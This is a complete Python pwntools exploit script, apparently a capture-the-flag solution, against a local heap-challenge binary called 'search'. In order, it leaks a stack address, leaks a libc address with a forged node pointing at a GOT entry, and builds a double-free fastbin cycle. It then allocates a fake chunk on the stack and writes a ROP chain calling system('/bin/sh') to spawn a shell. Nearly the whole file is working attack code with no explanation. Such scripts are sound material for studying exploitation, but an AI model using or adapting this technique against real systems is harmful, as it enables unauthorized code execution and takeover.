#!/usr/bin/env python3

from pwn import *

context(arch="amd64", os="linux")
context.log_level = 'debug'

pop_rdi_ret = 0x400e23
system_offset = 0x46590
puts_offset = 0x6fd60
binsh_offset = 1558723

def start():
    return process('./search-bf61fbb8fa7212c814b2607a81a84adf')

def leak_stack():
    p.sendline(b'A'*48)
    p.recvuntil(b'3: Quit\n')
    p.recvline()  # receive the "not a valid number" line

    p.sendline(b'A'*48)
    leak_line = p.recvline()
    leak = leak_line.split(b' ')[0][48:]
    # Convert the leaked address properly
    leak_val = u64(leak.ljust(8, b'\x00'))
    return leak_val

def leak_libc():
    index_sentence(('a'*12 + ' b ').ljust(40, 'c'))
    p.recvuntil(b'3: Quit\n')

    search('a' * 12)
    p.recvuntil(b'Delete this sentence (y/n)?\n')  # Fixed prompt
    p.sendline(b'y')
    p.recvuntil(b'3: Quit\n')

    index_sentence('d' * 64)
    p.recvuntil(b'3: Quit\n')

    search('\x00')
    p.recvuntil(b'Delete this sentence (y/n)?\n')  # Fixed prompt
    p.sendline(b'y')
    p.recvuntil(b'3: Quit\n')

    node = b''
    node += p64(0x400E90)
    node += p64(5)
    node += p64(0x602028)
    node += p64(64)
    node += p64(0x00000000)
    
    index_sentence(node)
    p.recvuntil(b'3: Quit\n')

    search('Enter')
    p.recvuntil(b'Found 64: ')
    leak = u64(p.recvline()[:8])
    p.recvuntil(b'Delete this sentence (y/n)?\n')  # Fixed prompt
    p.sendline(b'n')
    p.recvuntil(b'3: Quit\n')
    return leak

def index_sentence(s):
    p.sendline(b'2')
    p.recvuntil(b'Enter the sentence size:\n')
    
    if isinstance(s, str):
        s = s.encode()
    p.sendline(str(len(s)).encode())
    
    p.recvuntil(b'Enter the sentence:\n')
    p.sendline(s)
    p.recvuntil(b'Added sentence\n')

def search(s):
    p.sendline(b'1')
    p.recvuntil(b'Enter the word size:\n')
    
    if isinstance(s, str):
        s = s.encode()
    p.sendline(str(len(s)).encode())
    
    p.recvuntil(b'Enter the word:\n')
    p.sendline(s)

def make_cycle():
    index_sentence('a'*54 + ' d')
    p.recvuntil(b'3: Quit\n')
    
    index_sentence('b'*54 + ' d')
    p.recvuntil(b'3: Quit\n')
    
    index_sentence('c'*54 + ' d')
    p.recvuntil(b'3: Quit\n')

    search('d')
    p.recvuntil(b'Delete this sentence (y/n)?\n')  # Fixed prompt
    p.sendline(b'y')
    p.recvuntil(b'Delete this sentence (y/n)?\n')  # Fixed prompt
    p.sendline(b'y')
    p.recvuntil(b'Delete this sentence (y/n)?\n')  # Fixed prompt
    p.sendline(b'y')
    p.recvuntil(b'3: Quit\n')

    search('\x00')
    p.recvuntil(b'Delete this sentence (y/n)?\n')  # Fixed prompt
    p.sendline(b'y')
    p.recvuntil(b'Delete this sentence (y/n)?\n')  # Fixed prompt
    p.sendline(b'n')
    p.recvuntil(b'3: Quit\n')

def make_fake_chunk(addr):
    fake_chunk = p64(addr)
    index_sentence(fake_chunk.ljust(56, b'\x00'))
    p.recvuntil(b'3: Quit\n')

def allocate_fake_chunk(binsh_addr, system_addr):
    index_sentence(b'A'*56)
    p.recvuntil(b'3: Quit\n')
    
    index_sentence(b'B'*56)
    p.recvuntil(b'3: Quit\n')

    buf = b'A'*30
    buf += p64(pop_rdi_ret)
    buf += p64(binsh_addr)
    buf += p64(system_addr)
    buf = buf.ljust(56, b'C')

    index_sentence(buf)
    p.recvuntil(b'3: Quit\n')

def main():
    global p
    
    try:
        p = start()
        
        stack_leak = leak_stack()
        stack_addr = stack_leak + 0x22 - 8

        log.info('stack leak: %s' % hex(stack_leak))
        log.info('stack addr: %s' % hex(stack_addr))

        libc_leak = leak_libc()
        libc_base = libc_leak - puts_offset
        system_addr = libc_base + system_offset
        binsh_addr = libc_base + binsh_offset

        log.info('libc leak: %s' % hex(libc_leak))
        log.info('libc_base: %s' % hex(libc_base))
        log.info('system addr: %s' % hex(system_addr))
        log.info('binsh addr: %s' % hex(binsh_addr))

        make_cycle()
        make_fake_chunk(stack_addr)
        allocate_fake_chunk(binsh_addr, system_addr)

        p.interactive()
    
    except Exception as e:
        log.failure(f"Exploit failed: {str(e)}")
        if p:
            p.close()
        raise

if __name__ == '__main__':
    main()
